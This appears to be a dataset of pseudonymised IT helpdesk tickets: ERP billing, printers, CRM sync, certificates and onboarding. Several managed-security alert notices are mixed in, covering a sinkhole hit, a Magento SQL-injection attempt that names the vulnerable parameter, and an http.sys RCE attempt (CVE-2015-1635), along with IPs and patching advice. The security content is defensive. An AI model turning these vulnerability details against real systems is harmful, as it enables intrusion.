duplication of network address.,"

received from: kxsceyzo.naokumlb@gmail.com

gentles,

i have two devices that are trying to share an ip address. they are trying to share 96.26.27.9619. one is a printer with the hostname of prtjc0074, and the other is a new display for erp. the display is using dhcp to get its address assigned and the printer is hard coded.

my guess is that the address 96.26.27.9619 did not get set to a static address in dhcp. i need this corrected so the display will pick up another address.

hi -

the printer01 printer is not working and needs a part replaced.  can you reroute the jobs in queue to printer printer02?   wihuyjdo qpogfwkb has indicated that prqos001 needs a new part and it may not deliver for a few days so the inwarehouse_tools will need to print on printer02 for now.  this needs to be taken care of today since the inwarehouse_tools are printed and are picked up by an outside vendor at 2:30 pm in usa on a daily basis.   please contact dkmcfreg anwmfvlgenkataramdntyana if you have questions about the jobs in queue for today.

till last week i was accessing bex reports using mms portal and there were no issues.

starting this week the system is incredibly slow when i log in and finally does not allow me to access any reports.

can it be the issue with any maintenance or my access rights or rather i should try to access bex using different way?

below the print screen from what i see after log in:

erp pi and msd crm connectivity issue- serirtce certificate renewal,"hi all

we have a connectivity issue between erp pi and msd crm due to certificate renewal on azure websites and that certificate is not yet updated on erp pi side.

issue: changes to data records (accounts, sales area data, partner functions, contacts, leads) are not being processed from erp pi to 
worked with IT


msd crm and vice versa in all environments (prod, qa and dev).
issue start time: 24th oct ~8:15pm

troubleshooting steps: 
1. when tryhdty from customer master team reported the issue that a prospect account created in erp didn't come into msd yet – erp pi team observed that the records are in ""still awaiting acknowledgement"" status – which basically means they are not yet delivered/received by the target system.
2. upon some log analysis and trying to identify the root cause between erp pi, basis and msd teams – it's been observed that the issue has started in production environment since around 8:15pm est on 24th oct.
3. we observed the same behavior with azure mfg_tool and erp pi logs of other non-production environments as well.
4. you can find error screenshots from erp pi system in the mail chain.

root cause: it appears that the certificate for azure webapps have been updated on 29th sept 2016 as it is nearing the expiration date (11th jan 2017). but the new certificate is not updated on erp pi (they are not even aware of this change!). so, when the production azure webapp (company-crm-sp-mfg_toolt.azurewebsites.net) got restarted on 24th oct around 8:15pm – this connectivity appears to have been broken.

next steps: 
1. we need the azure webapp certificate chain to be sent to erp basis team so that they can update it on erp pi system. whom can i reach out to for receiving the certificate details? do we have an azure admin in house or do you want me to open a case with microsoft?
2. once certificate is received, maybe we can first do this on qa system and then upon confirmation that it works, we can apply it to production and other environments.

error - 
co account assignments have different profit centers
message no. bk134

diagnosis
you entered multiple co account assignments objects assigned to different profit centers. in a document item, however, all co account assignments objects with profit center assignments must be assigned to the same profit center.

procedure
if the message is an error message, check and change the co account assignments objects so that all objects with profit center assignments are assigned to the same profit center.

in customizing, you can change this message from an error message to a warning message, a notification, or you can deactivate it completely. to do so, see the implementation guide (img) step under ""controlling: general -> change message control"" (message class bk, message 134).

pricing condition issue in oa,"

received from: rayhtukumujar.br2@company.com

hello,

in the recent past, we are facing an issue of pricing condition not getting changed while booking the order.

though we override the pricing condition with znr, the pricing condition remains as zlp1 only.

for example, in oa 36131265, the price was over written with znr condition with a nett price of rs. 5726.54.  but still pricing condition is shown as zlp1 with standard discount.

what we have observed is whenever there are sub delivery items created due to non-availability of stock, this issue crops up.  that too, after the challan is created, it becomes too difficult to make any changes.

we request you to look into this immediately, assign sev2 ticket and resolve the same.

await your feedback.

"ultramdntyet wrongful inwarehouse_tool, so# 24897522","

received from: vflagort.xyotrhlf@gmail.com

good morning,

i just sent a request but found more data. so i received the attached email asking to look into the issue. when i look at the inwarehouse_tool (0159274337) referenced in the email, i saw the sample line was charged at cost when it shouldn't have been. when i go into the order, step on the sample line, go to document flow, i see a completely different inwarehouse_tool number than what is referenced. the inwarehouse_tool highlight below is for no cost, as it should be.
[cid:image001.png@01d22471.b60d3930]

when i look at the document flow for the entire order, i see both inwarehouse_tools.
[cid:image002.png@01d22472.10904e10]

please help me understand why the customer was inwarehouse_toold twice for the sample, and why the second inwarehouse_tool is at cost when it should not be. let me know what i need to do on my end to help with this, please.

for record, the inwarehouse_tool sent on 9/19 is correct.

sales orders are not updating with correct delivery dates ,"this is in reference to so# 35086652

this all started with this email; ""i called company and spoke with wkpnlvts oumeaxcz and has confirmed that the items are in route from germany and are scheduled to get to them on 10/18/16 and turn around and ship to us.  the new delivery date is for 10/19/16.  she was not sure why the date of 12/16/16 is on the company center.""

after investigating this and looking at screen shots provided by heidi, this is what is happening.  ""manufacturing updated the information in the system, and if a csr ran an apo availability check on the art, they could see the updated date of 10/19, but it did not update the delivery date in the order.  i went into the order and manually ran a apo stock update on the order, and it updated the delivery date to 10/19.  if the customer were to look at it now through company center, they would see a delivery date of 10/19.""

when manufacturing updates the delivery time for an order, it has to update on all open orders for that item.  in this case it did not.  we are loosing orders because of this issue as it has been going on for some time now, but this is the first time i have documented screen shots of what was going on.  csrs can not run apo every time a date is changed in erp.  this has to be automated.  anything less is unacceptable.

if an update is done on the billing via vf02, the correct output type gets automatically added. therefore we need to have a mass update done (just go to change mode and save), so that the missing printouts get added and issued to the appropriate printer. (billings with existing output might be amongst the list, these are good and no action is required.)

important: *
*************
if the mass update is done, please don't do it any any regular billing job times and note the issued documents from erp spool. the list of billings attached might also have documents with output assigned to other printers than fd37v. these billings are correct.
accounting department, however, would need to have a list of all billings where the output now would get generated, as the customer might get reminders or dunnings for the same. we need to clearly trace these billing documents with output only now generated for audit reasons. we need to get the print outs as soon as possible. please help to support this request as soon as possible as some customers get annoyed with wrong dunnings.

often when i wake it up from powersave mode it is still connected to my local wifi network, but as a „not identified"" network with no internet connection. my private owned devices (pc, smartphone,tablet) still work fine.
i have to shut down and restart the dell again to get a proper connection.

final inwarehouse_tool for project is not working correctly,"dear it team,

i have again an issue with a final inwarehouse_tool. i have the following erp order: 34827963.
we had a down payment of all items, but a final shipment of item 10,20,50,60,70.
items 30 and 40 have not been shipped, hence we are not allowed to do an final inwarehouse_tool for this. 
so i tried to do a final inwarehouse_tool for items 10,20,50,60,70, but it did not work. with inwarehouse_tool 0159198781 the down payment amount got deducted twice. 
so i cancelled all inwarehouse_tools, incl. down payment inwarehouse_tool and separated them, one inwarehouse_tool for item 10,20,50,60,70 and another inwarehouse_tool for item 30,40.
after that i tried again to inwarehouse_tool it. but still the wrong amunt was shown. i need to have an inwarehouse_tool for item 10,20,50,60,70 with amount 350.740 minus 105.222 down paymant. can you please have a look and help me?

can you please advise whether crm is going through updates at the moment?

there are a number of issues concerning us in 1301:


1.       at the moment we cannot access crm at all.

2.       yesterday, i could not enter new customer accounts as my drop down boxes were not fully loading and thus, i could only see one or two items to select from.

3.       the team here in australia advised that lately that they have had to contact customer master on numerous occasions as there are certain entries in crm, new customer accounts, that are not transferring to erp like:
sales reps
carriers
etc

we were advised by our finance department that they believed it were aware of such problems above?

partial confirmation info sent to erp but machine status behaving differently (usa),"usa go-live week. issue reported on 9/21

order #226038501 
op # 0030 
work center # 73122161

operation was in prir status [9/2sartlgeo lhqksbdx2.33 pm] but mii won't allow to resume run. 
gergryth changed status in mii from prst to prir, it changed status in to-di list but not in machine summary

start process = 9/20 19.43 = 7.43 pm
current time = 9/2sartlgeo lhqksbdx2.50 pm
time elapsed ~17 hours and that's what we're seeing on machine summary dashbankrd meaning mii did send partial confirmation information to erp but didn't used the same information for machine status view etc. 

so, in summary, the partial confirmation information made it to erp perfectly fine but the machine status windows wasn't updated with partial confirmation pause and behaved as if partial confirmation pause never happened





example from usa
for usa location and order 226033677, operation 10

mii showed the order in prpf status, looking at erp, order was partially confirmed followed by ""automatic pause"" which mii adds. change log shows all entries were done by miiadmin. it's weird since erp is showing expected status which is provided by mii but mii itself is showing prpf status which does not make sense. reporting this issue so team can do a deep dive and come up with the solution

vip 2--workflow notifications in  universal worklist.,"vip 2 - ticket

received from: dxyvfuhr.uyfqgomx@gmail.com


all, having reviewed this with joothyst and clrgtydia, the problem is not caused by the exclusion list, or the cm workflow.
the problem is because of a security configuration, where joftgost receives items in the universal worklist, but no e-mail notification.
we traced this to screen su01d, where in the screenshot attached to this incident, you will see the e-mail address for joftgost is incorrectly ""joftgost.berfkting@company.com"".
please update this to ""dxyvfuhr.uyfqgomx@gmail.com"".

hello,

the issue is that your userid is locked in erp SID_34 and in erp SID_39.
you need to go to the password_management_tool password manager and first select the option ""unlock accounts"", after that select the option ""change password""
once that is completed successfully, you should logon to distributor_tool with that new password.

shathyra, lunjuws

zd13 is the delivery output type which was developed for baker huges when usa went live on erp..

delivery note output type ""zdus"" will be added automatically as soon as the delivery note is created if there is no specific customer specific output type maintained.

in this scenario since we have already a customer specific output ""zd13"" maintained in output config, ""zdus"" will be automatically replaced with ""zd13"" & it will print immediately in ""hx08""printer. (printer hx08 has been defined as default printer for sales org 1101 and customer 81917193 combination).
[cid:image003.png@01SID_353fb.6857f6c0]

the complexity is that we are shipping to customer ""81917193"" from both usa and usa.

can you please confirm if we are using z_chk to print the delivery note usa.

lunjuws: we need your help to check with usa team if they are using z_chk for printing delivery note..

based on the above information we shall check on the possibilities and let you know..

my dilemma is-since we have started shipping to bakyhrer huhuyghes-our delivery notes are still printing to usa.  who do i need to contact about this?  if it is the help desk-i'm not sure what/how to ask for it.  they aren't as easy to explain stuff to as you are...  we are wanting the transaction ""zdus"" to be added to  the delivery output screen, instead of zd13.    usa used zd13   we were using zd12   but zdus is what we really need to be using.
  if i have talked myself in circles   let me know and i'll try to explain it a little better.

this is an example of  what we want
[cid:image001.png@01SID_353fa.f482f2e0]

this is what we get right now  after we go in and add the zd12 to get a delivery note to print here---

batch number is not appearing in pdf output of engineering_tool,"

received from: xqkydoat.bveiyclr@gmail.com

dear sir,
refer below snapshot of pdf output of engineering_tool.
batch number is not appearing in pdf output.
[cid:image008.jpg@01SID_35366.4a922790]

why batch number is important?
in case of variation in tool life from batch to batch, customer raises the complaint. we send ccif with engineering_tool. in engineering_tool software we enter batch number but when i download pdf, it doesn't show batch number. without batch number, analysis cannot be done. that's why it's very important to capture batch number in engineering_tool pdf output.

for your necessary action.

last week, especially friday it was very bad all day.
yesterday and today, again it seems to lag after that 12 noon time.
this is becoming continuously embarrassing during phone calls when i am required to search for stock or quote/order over the phone as i have to apologise for the system taking so long.

there are two other csr's in the building, uisewznr ewtmkphs rarely has the same trouble (his system seems faster though), much faster than mine or duoyrpvi wgjpviul, amy's system will lag but not as much as mine.

can you please shed some light on this scenario?

note:  it is more convenient for this office if i can be contacted mid/late mornings.

we are seeing your 10.16.4.16/isensor04.company.com device generating '52151 vid36000 server response with anubis sinkhole cookie set - probable infected asset' alerts for traffic (not blocked) from port 80/tcp of 195.22.28.222 to port 55372/tcp of your android-13849fa3e9c2e1e3/12.90.42.78296 device indicating that the host is most likely infected with malware. 

this return traffic indicates that android-13849fa3e9c2e1e3/12.90.42.78296 has most likely attempted to visit a domain name which is being sinkholed. dns sinkholes are dns servers that give out false information in order to prevent the use of the domain for which ip address resolution has been requested. sinkhole traffic is a possible indicator of an infected computer that is reaching out to a controller that has been taken over by a law enforcement or research organization as part of a malware mitigation effort. traffic to a sinkhole should be examined for characteristics of automated activity. in some cases, an administrator may be curious about a particular domain and browse to it, triggering the signature. repeated automated requests to a sinkhole, however, are a clear indication of a malware infection.

we are escalating this incident to you via a high priority ticket per our default escalation policies. if you would like us to handle these incidents differently in the future (see below for handling options), or if you have any further questions or concerns, please let us know either by corresponding to us via this ticket and delegating the ticket back to the soc, or by calling us at 
1) ticket only escalation for sinkhole domain alerts (explicit notification via a medium priority ticket (no phone call))
2) auto-resolve sinkhole domain alerts directly to the portal (no explicit notification but events will be available for reporting purposes in the portal)

sincerely,
 soc


=========================
technical details
=========================
the domain name system (dns) is a hierarchical naming system for any resource connected to the internet or a private network which has the primary purpose of associating various information with domain names assigned to each of the participating entities. it is primarily used for translating domain names to the numerirtcal ip addresses for the purpose of locating service and devices on a network. 

the domain name system distributes the responsibility of assigning domain names and mapping those names to ip addresses by designating authoritative name servers for each domain. authoritative name servers are assigned to be responsible for their supported domains, and may delegate authority over subdomains to other name servers. the domain name system also specifies the technical functionality of this database service. it defines the dns protocol, a detailed specification of the data structures and data communication exchanges used in dns, as part of the internet protocol suite.

dns sinkholes are dns servers that give out incorrect information in order to prevent the use of the domain name for which ip address resolution is being attempted. when a client requests to resolve the address of a sinkholed hole or domain, the sinkhole returns a non-routable address or any address except for the real address. this germanytially denies the client a connection to the target host. using this method, compromised clients can easily be found using sinkhole logs. another method of detecting compromised hosts is during operations in which servers being used for c2 (command and control) purposes are taken over by law enforcement as part of a malware mitigation effort. traffic to a sinkhole should be examined for characteristics of automated activity. in some cases, an administrator may be curious about a particular domain and browse to it, triggering the signature. repeated automated requests to a sinkhole are a clear indication of infection by a trojan of some sort.

connections to sinkholes may seem somewhat benign, but the ramdntyifications certainly include information leakage to some extent. although sinkhole operators are unlikely to use any personally identifiable information they may capture from a trojan's communication, it may become public knowledge that ""company x is infected with y"", which may lead to reputational damage.

additionally, some sinkholes are feeding ip addresses of victims to beshryulists, which may impede access to certain services, like sending email. finally, some trojans may connect to multiple controller domains/hostnames, and even though some of them may be sinkholed, there may be others that are not, leading to the possibility of remote code execution or information leakage to malicious parties in some cases.

connection issues with secomea site manager,"well i have fighting with this all week. our suppliers technical department has been helping also.

just to refresh your memory we are having trouble connecting secomea site managers to the secomea cloud.

history:

i configured a total of five secomea site mangers and i uacyltoe hxgaycze them as each one is complete
the first two worked, and still work fine
the third one started dropping off of the cloud and wont connect at all now
units four and five wont connect at all and never did

i tried unit three at building one and two…no luck

i took unit three home and connected it to my router…it connects and i can see it on the gate manager!

we use these in every machine we build so i'm asking for help from company's it department and some direction. 
i realize it might not be familiar with this product so i have attached a simple troubleshooting guide from secomea.

this ticket will effectively serve as a master ticket for any related alerts until we receive feedback from you on how to handle these events going forward. please let us know either by corresponding to us via this ticket and delegating the ticket back to the ctoc, or by calling us at  we have a number of options available for the handling of future alerts such as this one:

1) autoresolve these alerts directly to the portal (no explicit notification and events will be available for reporting purposes in the portal). this is most likely the best choice if you are not running the application being targeted.
2) ticket only escalation via a medium priority ticket (no phone call) for each unique source ip address for these alerts (this may generate a relatively large volume of incident tickets). 
3) full escalation via a high priority ticket and a phone call for each unique source ip address. 

we would not recommend options 2 and 3 since the exploit code is in the wild and merely identifying the sources of the attack may not be very useful, and we can always run reports on the portal to identify a list of attackers. instead we would recommend auditing your environment for vulnerable systems and updating them as necessary. once you have completed this, you could go with option 1 to suppress alerting on these events.

sincerely,
 ctoc


=========================
technical details
=========================
a vulnerability exists in magento due to insufficient input validation within the mage_adminhtml_block_widget_grid::getcsvfile() function. a remote attacker could exploit this vulnerability to conduct sql injection attacks on vulnerable systems.
magento is an eusa platform. a vulnerability exists in magento commstorage_product edition (ce) versions 1.4.00 through 1.5.0.1, version 1.5.1.0, versions 1.6.0.x, versions 1.6.1.x through 1.6.2.x, versions 1.7.x, and versions 1.8.x and 1.9.x and in magento enterprise edition (ee) versions prior to 1.14.2.0 due to insufficient input validation. user-controllable supplied via the 'popularity[field_expr]' paramdntyeter, when the 'popularity[from]' or 'popularity[to]' paramdntyeter is set, is not properly sanitized for illegal or malicious content by the mage_adminhtml_block_widget_grid::getcsvfile() function prior to being stored in a $fieldname variable and used in an sql query. remote administrators could leverage this issue to conduct sql injection attacks by injectncqulao qauighdplicious sql code into an affected input. successful exploitation may permit an attacker to manipulate sql queries and execute arbitrary sql commands on the underlying database.

the ctoc has received at least 4 occurrences of '52853 vid68372 possible magento mage_adminhtml_block_widget_gridgetcsvfile() sql injection attempt inbound (cve-2015-1397)' alerts from your isensor device (208.211.136.207/isensplant_247.company.com) for traffic (not blocked) sourcing from port 55334/tcp of 166.78.155.100 (dallas, usa) destined to port 80/tcp of 208.211.136.158 (usa, usa) that occurred on 2016-09-17 at 11:35:02. this indicates that the external host at 166.78.155.100 and possibly other sources are attempting to discover if your public facing servers including 208.211.136.158 is vulnerable to the ""magento mage_adminhtml_block_widget_grid::getcsvfile() sql injection vulnerability"" described in cve-2015-1397.

this ticket will effectively serve as a master ticket for any related alerts until we receive feedback from you on how to handle these events going forward. please let us know either by corresponding to us via this ticket and delegating the ticket back to the ctoc, or by calling us at. we have a number of options available for the handling of future alerts such as this one:

1) autoresolve these alerts directly to the portal (no explicit notification and events will be available for reporting purposes in the portal). this is most likely the best choice if you are not running the application being targeted.
2) ticket only escalation via a medium priority ticket (no phone call) for each unique source ip address for these alerts (this may generate a relatively large volume of incident tickets). 
3) full escalation via a high priority ticket and a phone call for each unique source ip address. 

we would not recommend options 2 and 3 since the exploit code is in the wild and merely identifying the sources of the attack may not be very useful, and we can always run reports on the portal to identify a list of attackers. instead we would recommend auditing your environment for vulnerable systems and updating them as necessary. once you have completed this, you could go with option 1 to suppress alerting on these events.

sincerely,
 ctoc

skype - poor quality,"

received from: azxhejvq.fyemlavd@gmail.com

please open a ticket for me.  i have been on a few skype calls recently where the quality was very poor.  these calls were multinational with india or apac with participants in the us.  the audio quality was so poor that we could not understand each other to the point that the meeting was almost a waste of time.  also, the ability to broadcast powerpoint or erp screen images was bas as well were some of the participants of the meeting could not see the content again making the meetings a waste of our time.

design_tool service: file naming convention has changed,"the geengineering_tooloductdata web service calls the design_tool service to obtain cad models for engineering_tool.
i believe this link points to the design_tool uacyltoe hxgaycze service: 

looks like the naming convention has changed in the last few days and files returned by this service are being named with just the materials_management number.
(e.g. mm 7304975 in SID_34. see the attached fw  engineering_tool drills.msg for more details)

the change is causing issues with models not being returned to  engineering_tool.
engineering_tool will be demoed at imts starting on monday the 12th. 
need an urgent fix to revert any changes that might have been made to the file naming convention for files from the design_tool service.

below are the original rules uli had implemented for file names for cad files returned by this service.
here are the implemented naming rules:

• if there is a cad_catalog_iso it's taken, 
o else if there is a cad_catalog_ansi it's taken,
 else rqfhiong zkwfqagb is taken
• an underscore plus cad_graph_type is added 
• finally the original file extension is added

approval workflow problems,"
i am approfghaching you, as we have problems with our approval workflow for credit memo requests respectively rmas.
i opened several tickets regarding this topic, which unfortunately did not lead to a final solution.
maybe it is a (erp-) language problem for my part.
anyway, i  hope, that you can help to get this fixed.

the approval levels for our organization are as follows (regardless who is the sales person in customer account)
level 1 (1.000€-4.999€): jwqyxbzs adpvilqu (afcbrhqw vudghzcb as subsitute, if possible)
level 2 (5.000€-9.999€): jwqyxbzs adpvilqu (afcbrhqw vudghzcb as substitute if possible)
level 3 (10.000€-24.999€): qsoxltny dzjespml (tjnwdauo jkdwbhgs as substitute if possible)
level 4 (25.000€ plus): michghytuael rünz (tjnwdauo jkdwbhgs as substitute if possible)

it often happens, that these workflows are routed to the wrong person.
lauacyltoe hxgaycze example: rma 7611183856 was routed to me at level 1 and approved, but then to jmkcewds qkoipbzn at level 2, wo has nothing to do with it.

it takes a lot of time, to gather the wrong routed workflows and to forward them to the responsible person.

i appreciate your help.

bahdqrcs xvgzdtqj's onbankrding experience,"

received from: xzupryaf.vlbikhsm@gmail.com

hello,

bahdqrcs xvgzdtqj was an intern that we hired on full-time effective aug. 16th. we followed the process of having her old manager transfer her to her new manager in oneteam and then her new manager entered her new job and compensation information like he's been instructed to. however, i have to be honest, her onbankrding experience has been a disaster so far. she says that every time she calls hrss to help her out, they are not very helpful or resolve her issues. hrss will tell her it's an ""it problem"" and it will tell her that it's an ""hr problem."" here are some of the issues that she's still having:


1.      no access to benefit information on collaboration_tool – when she follows the directions that she was given, she gets an error message that says ""needs approval, request has been submitted.""

2.      no ethics access

3.      no expense report access – she was able to enter her expense report, however when she went to submit it she got an error message and now when she tries to log-in, she gets an error message. it said that this is an it problem.

4.      no access to the vpn – again, it said that hr needs to update the SID_34? i'm not really sure what that is.

5.      incorrect paychecks – she did not receive a paycheck on 8/30. i told her that depending when her information was processed, payroll might not have caught the fact that she's salary now and then it should all be corrected on her 9/15 paycheck. sharee emailed her yesterday and made it sound like everything was going to be corrected on her 9/15 paycheck, but then sent a follow-up email saying that because u2 already ran, she was not going to be able to backdate and the effective date for this change was going to have to be 9/1. she wants liuytre to provide her hours worked from 8/18 – 8/31. this is not going to work because liuytre stopped tracking her hours since she is now a salaried employee. she was also at a company conference the week of 8/22 and ""technically"" worked way more than 40 hours that week because she was part of meetings, dinners and after hours' team building activities.

can someone from it and shared services be her ""designated"" contact and work with her through these issues until everything is figured out? if something is an it issue, can hrss follow-up with it so she's not being passed back and forth? she is beyond frustrated and only has until next friday to figure out her benefits before her eligibility timeframdntye is up.

i have made several attempts to print to printer cl98.  i have also powered the device down then back up. and retried printing.  no print but the printer drivers are refreshed.
had a colleague try and she had the same results

i deleted the printer cl98 from my pc and reinstalled it.  it reinstalled as prtgn0022.  when i printed to it the print came out successfully.

how can a printer be changed from cl98 to gn22 without notification?  should this printer be known as gn22 or is this a error that requires further investigation?

ein „gast"" scheint versehentlich immer neue druckaufträge zu generieren bzw. laut service techniker vom hersteller hp ist wohl ein spool auftrag im netz gespeichert – wir können die druckaufträge nicht sehen, nachverfolgen oder stoppen.

alle versuche, die druckaufträge abzubrechen, sind fehlgeschlagen, auch ein ziehen des steckers oder des lan-kabels nützt nichts.

wer kann helfen?
laut hp sollte das der administrator können.

hello,

every month we see difference   in quantity   in inventory  between  plant_63  stocks  & erp   stocks   .

our assumption was that  in  erp  we inward   stock without paper (customer return  with- out paper but good for resale ) , but it is not so.

in this connection  attaching the  extraction of plant_63 register  as on 31.8.16 , erp inventory (plant_63)  and   workings which show difference between
 erp & plant_63   register

i have highlighted   few material  code  in red color which is the difference between    erp & plant_63   and   throws light   that inward   is made with paper  also  downloaded  screen shot of 2 material  code for your reference

request you to  investigate  and   revert  with reasons for such difference   .

this is time bound activity  and we expect this to be closed by sept 25  , 2016   as the same needs to  informed to the auditor  for  sept 30,2016 .

hana ,"

received from: nealxjbc.owjduxai@gmail.com

earlier i started a chat with rakthyesh.  i was pulling a report though hana and after selecting the analysis tab and refreshing i was thing going to display.  i needed to filter this template to add my plant.  when i would select display all of my boxes were empty (see attached).  he did something and asked me to close and reopen.  once i reopened my analysis tab was gone so i wasn't able to refresh to then go to display to see if my filters were fixed.

he then fixed my analysis tab while we were still in chat but after doing this when i tried to select display the white boxes that i was seeing was no longer showing.  i would hit display and all i could see was my spreadsheet (no boxes).

he said he would have to do a ticket.  i've not been copied on a ticket buy i need to run this report.

before sending this email i went back into hana to see if by chance my report or problem was fixed and the analysis tab is gone again.

if you can please correct this for me.

hello.

this report is your weekly open order schedule lines report.  it lists all scheduled delivery dates for open orders for your customers. 

it is expected that you will use this report to effectively manage your sales territory.

if you have any questions with regard to the report please contact your regional sales operational excellence lead.

how to read this report
all scheduled order items are listed on the report.  the columns with the purple field names show total values for that line on the order, and should not be added together.  these total values will appear on every scheduled line.  in the example below, a line item has a total quantity ordered = 10 pieces and three scheduled deliveries of 1, 2 and 7 pieces.  the report will repeat the total quantity ordered = 10 on every schedule line:

order nbr    item nbr    create date     qty sched     value sched    date sched    unit price    qty order

tut mir leid leute. ich kann nicht den ganzen tag damit verbringen, mir neue passwörter zu überlegen.
bringt password_management_tool mit erp pw endlich zum laufen, damit diese firma effizienter wird.

2. if we enter invalid reason code, the save button is disabled after warning message - so operator can't fix invalid data but has to close the confirmation window, type information again and then enter - can we fix this? ",entuakhp xrnhtdmk,GRP_41

incident overview
=========================
we are seeing '51551 vid67965 microsoft windows httpsys rce vulnerability exploit attempt (ms15-034 cve-2015-1635) - mapp' alerts being generated by your isensplant_247.company.com/208.211.136.207 device indicating that one or more hosts, including 198.8.80.219, are attempting to exploit the microsoft windows http.sys remote code execution vulnerability (cve-2015-1635/ms15-034) on one or more of your internet-facing hosts, including 208.211.136.164/208.211.136.164,. successful exploitation of this vulnerability may result in a denial of service condition or remote code execution on vulnerable systems. 

we are escalating this incident to you via a high severity/full escalation master ticket for all unblocked events related to this vulnerability (i.e. we are creating a singular ticket for all inbound threats related to this vulnerability). this ticket will effectively serve as a master ticket for any related events until we receive feedback from you on how to handle these events going forward. 

it should be noted that blocking each source ip address may not necessarily be productive due to attackers' ability to switch ip addresses through the use of proxies, anonymizing software such as tor, and vpns. please investigate your environment to determine whether you are running a vulnerable version of the application being targeted and ensure that you are running the most recent non-vulnerable version of windows, and that your devices are patched and properly hardened against attacks.

if you would like these events handled differently, please let us know either by corresponding to us via this ticket and delegating the ticket back to the soc, or by calling us at . we have a number of options available for the handling of future alerts such as this one:
1) autoresolve any events related to attacks against the microsoft windows http.sys kernel driver directly to the portal (no explicit notification and events will be available for reporting purposes in the portal). this is most likely the best choice if you are not running the application being targeted or if you are running a non-vulnerable version of the application
2) ticket only escalation via a medium priority ticket (no phone call) for each unique source ip address for attacks against the microsoft windows http.sys kernel driver (this may generate a relatively large volume of incident tickets)
3) full escalation via a high priority ticket and a phone call for each unique source ip address for attacks against the microsoft windows http.sys kernel driver (this may generate a relatively large volume of incident tickets)",afkstcev utbnkyop,GRP_12

all vip and critical/machine pc's should be done manually by the respective it/site contact. for the manual installation, both site admin and the users must have the local admin privileges on the respective pc's to complete the see agent installation without any issue's.

please access the following server share for manual installation (user must be either on office lan or vpn network to access the server share as provided).

1.       need a common place for online  storage of 3d complete machine assembly models at one place. presently the drawings are in individual designer's pcs and retrieval is difficult.
                day by day as more & more machines are designed in 3d the data handling is going out of control.

2.       common place (separate drive)  under administrative control to save and view these complete machine assembly models.

3.       periodic back up & archiving of data stored at this place.

received from: wqfzjycu.omleknjd@gmail.com

hi deeghyupak,

i was on vacation when your e-mail was sent last week and only managed to see it on my return minutes before the automatically deployment.

on a general note unless there is a critical security risk deployment these updates should be limited to once a month, so far this month this is the third deployment. you may not realize the impact this has on our users especially the unannounced updates. in addition with users similarly to csr who are working directly with our customers, i do not think it is the best practice to deploy automatically updates especially to all users all at the same time.

the impact of yesterday's deployment was that our csr phones were not operating for over 2 hours during the morning.

=========================
technical details
=========================
remote procedure call (rpc), also known as the loovexfbjy lmcaqfkz (loc-srv), is a microsoft windows protocol that allows an application to to execute code in another address space (commonly on another computer on a shared network) without the programdntymer explicitly coding the details for this remote interaction. that is, the programdntymer writes germanytially the same code whether the subroutine is local to the executing programdnty, or remote. 

an rpc is initiated by the client, which sends a request message to a known remote server to execute a specified procedure with supplied paramdntyeters. the remote server sends a response to the client, and the application continues its process. rpc runs on port 135, and is used in client/server applications (such as microsoft exchange clients, mgermanyger service, dhcp server, dns server, wins, as well as other windows applications). vulnerabilities in rpc have also been leveraged by several worms as a means for propagation. examples include:
-w32.blaster.worm/msblast/lovsan 
-w32.welchia/nachi
-w32.reatle

i see a certificate error for this site in ie and chrome. (see attached screenshot)

i ignored the error and logged in to create a couple of accounts yesterday.
given that account credentials are limited to a max of 1 day, i went in today and tried to ""edit"" the accounts to change the date for today.
everything looked okay in the web app but users were not able to login.

i even tried to reset the password for one of the users but that didn't help either.

it is cumbersome to re-type the same info and create new accounts for each day.
it would be great if the certificate issues are taken care of and accounts could be created for multiple days( or it is easier to renew passwords)

hi deeghyupak,

it seems that there has been a lack of knowledge regarding this deployment of telephony_software in israel.

from the very beginning all our users apart from rabin have been working with the software in hebrew.

also i am not sure deployment on telephony_software pc's all at the same time should occur in the middle of the working day.

please let us know when you have a hebrew version available and then we can discuss the deployment.

hi daghyunny,

there was no issue with respect to new telephony_software application and it was deployed successfully through patching_antivirus_sw. deployment was scheduled based on the os language, which in this case was english.
since we were not supporting hebrew language in the past, we deployed english language telephony_software 2016 r2 in israel pcs.
csr team in israel had raised a concern that they can't work without hebrew language pack as confirmed by aofnvyzt eqiyskhm. same english package of new telephony_software application is deployed successfully for the aofnvyzt eqiyskhm and he is able to work without any issues. dyxrpmwo hcljzivn  local it from poland uninstalled new version of telephony_software and installed old telephony_software 4.0 on their pcs without informing us.

to fulfill local csr team requirement we can reschedule the new telephony_software application through remote deployment and hebrew language pack can be installed manually on their pcs.

zpdist_programdnty not allowing to distribute against planned orders and production orders,"
hello chandruhdty, ebi,

i´ve created an example in SID_1 for debugging an fixing. production order to receive is 226138271 // mm# 4289785.
the issue does not only appear in case the user tries to ship against a planned order but also when trying to ship against a production order.

shipping against planned orders:

it looks like zpdist_programdnty does only allow to ship against planned orders in case the planned order finish date is due or past due (purple example in the screenshot). in case the planned order finish date is not due (red example) zpdist_programdnty does not allow to ship against the planned order.

the following things need to be changed:

- zpdist_programdnty should allow to force the shipment against planned orders even though the planned order is not due (just like zpdist_programdnty does for stock transfer orders)
- zpdist_programdnty should use the planned order start date rather than the planned order finish date to determine whether the planned order is due

shipping against production orders:

it looks like zpdist_programdnty does only allow to ship against production orders in case the basic finish date of the production order is due or past due (blue example). in case the basic finish date of the production order is not due (yellow example) zpdist_programdnty does not allow to ship against the production order.

the following things need to be changed:

- zpdist_programdnty should allow to force the shipment against production orders even though the production order is not due (just like zpdist_programdnty does for stock transfer orders)
- zpdist_programdnty should use the basic start date (which is already shown in the transaction) rather than the basic finish date to determine whether the production order is due",cfajzero vlygoksi,GRP_18

new prospect accounts created in crm do not get an erp number ,"hello, 

i have two specific cases where a newly created prospect account in crm (modern construction and sandfield engineering) does not get an erp number, even after some days. after having run an advanced find search i found we have 385 such cases. please see attached file that describes the issue and the unique steps. 

if prospects do not get an erp id it results in the fact that they do not show up in the users´""my active prospects"" view because it filters on prospects with erp id. users think that the account was not created and create the over and over again. we should review if we want to change the logic behind this view - i assume the filter was put in to exlude non-complete accounts. 

another issue i found during this troubleshooting process is i deactivated such a duplicate prospect and the audit log shows that 5 minutes later the account got activated again and got the erp number, too. please investigate this one too.

incident overview
=========================
we are seeing your 10.32.100.17/isensor03.company.com device generating '51793 vid36000 server response with anubis sinkhole cookies set - probable infected asset' alerts for traffic (not blocked) from port 80/tcp of 195.38.137.100 to port 3720/tcp of your lpawx210968sf/61.01.52.02617 device indicating that the host is most likely infected with malware. 

